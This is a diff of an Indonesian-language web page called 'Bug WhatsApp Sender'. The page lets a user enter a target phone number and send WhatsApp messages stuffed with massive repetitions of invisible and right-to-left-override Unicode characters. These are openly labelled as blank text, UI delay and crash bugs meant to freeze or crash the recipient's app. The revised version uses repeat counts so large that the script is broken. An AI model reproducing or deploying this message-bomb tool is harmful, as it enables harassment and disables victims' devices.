@@ -3,91 +3,29 @@
 <head>
   <meta charset="UTF-8" />
   <title>Bug WhatsApp Sender</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
   <style>
-    * {
-      box-sizing: border-box;
-    }
-    body {
-      font-family: 'Poppins', sans-serif;
-      background: #0f1115;
-      color: #fff;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 40px 20px;
-      min-height: 100vh;
-    }
-    h2 {
-      font-size: 26px;
-      margin-bottom: 30px;
-      color: #25D366;
-    }
-    input, select, button {
-      width: 100%;
-      max-width: 400px;
-      margin: 10px 0;
-      padding: 15px;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      font-family: inherit;
-    }
-    input, select {
-      background: #1f1f24;
-      color: #fff;
-    }
-    button {
-      background: #25D366;
-      color: #000;
-      font-weight: bold;
-      transition: 0.3s ease;
-      cursor: pointer;
-    }
-    button:hover {
-      background: #1ebe5d;
-      transform: scale(1.05);
-    }
-    .container {
-      width: 100%;
-      max-width: 420px;
-      background: #191b1f;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 30px rgba(0, 255, 100, 0.1);
-    }
-    .label {
-      text-align: left;
-      width: 100%;
-      max-width: 400px;
-      font-weight: 600;
-      margin-top: 15px;
-    }
+    body { font-family: sans-serif; text-align: center; padding: 30px; }
+    textarea, input { width: 300px; margin: 10px; }
+    button { padding: 10px 20px; font-size: 16px; }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>🧨 Bug WhatsApp Sender</h2>
+  <h2>Bug WhatsApp Sender</h2>
+  <input id="nomor" placeholder="Masukkan nomor (628xxxx)" /><br>
 
-    <div class="label">📱 Nomor Target (awali 62):</div>
-    <input id="nomor" placeholder="Contoh: 6281234567890" />
+  <select id="jenis">
+    <option value="blank">🕳️ Blank Text</option>
+    <option value="ui">🐢 UI Delay</option>
+    <option value="crash">💥 Crash Ringan</option>
+  </select><br>
 
-    <div class="label">💣 Jenis Bug:</div>
-    <select id="jenis">
-      <option value="blank">🕳️ Blank Text</option>
-      <option value="ui">🐢 UI Delay</option>
-      <option value="crash">💥 Crash Ringan</option>
-    </select>
-
-    <button onclick="kirim()">🚀 KIRIM SEKARANG</button>
-  </div>
+  <button onclick="kirim()">KIRIM SEKARANG</button>
 
   <script>
     function getBug(type) {
-      let bug1 = "\u3164\u3164\u3164\u3164\u3164".repeat(3000); // Blank
-      let bug2 = "\u200F\u202E\u2063\u3164".repeat(4000);       // UI Delay
-      let bug3 = "\u202E\u202E\u202E\u202E".repeat(2000) + "🔒".repeat(300); // Crash
+      let bug1 = "\u2063".repeat(5000);
+      let bug2 = "\u200F\u202E\u2063\u3164".repeat(9999999999999);
+      let bug3 = "\u202E\u202E\u202E\u202E\u202E".repeat(999999999999) + "🔒".repeat(999999999);
 
       if (type === "blank") return bug1;
       if (type === "ui") return bug2;
@@ -95,12 +33,12 @@
     }
 
     function kirim() {
-      const nomor = document.getElementById("nomor").value.trim();
-      const jenis = document.getElementById("jenis").value;
-      const bug = encodeURIComponent(getBug(jenis));
+      let nomor = document.getElementById("nomor").value;
+      let jenis = document.getElementById("jenis").value;
+      let bug = encodeURIComponent(getBug(jenis));
 
-      if (!/^62\\d{8,15}$/.test(nomor)) {
-        alert("Masukkan nomor yang valid diawali 62 tanpa spasi atau +");
+      if (!nomor.startsWith("62")) {
+        alert("Gunakan format nomor 62...");
         return;
       }
 
